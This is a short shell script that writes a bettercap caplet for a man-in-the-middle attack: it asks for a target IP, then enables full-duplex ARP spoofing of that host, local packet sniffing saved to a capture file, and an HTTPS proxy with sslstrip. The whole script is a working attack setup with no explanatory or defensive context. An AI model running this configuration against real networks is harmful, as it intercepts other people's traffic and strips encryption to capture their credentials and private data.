cp /dev/null caps/spoofer.cap
echo "net.probe on" >> caps/spoofer.cap
echo "set arp.spoof.fullduplex true" >> caps/spoofer.cap
echo "enter ip"
read ip
echo "set arp.spoof.targets $ip" >> caps/spoofer.cap
echo "arp.spoof on" >> caps/spoofer.cap
echo "set net.sniff.local true" >> caps/spoofer.cap
echo "set net.sniff.output ../output.cap" >> caps/spoofer.cap    
echo "set https.proxy.sslstrip true" >> caps/spoofer.cap   
echo "net.sniff on" >> caps/spoofer.cap
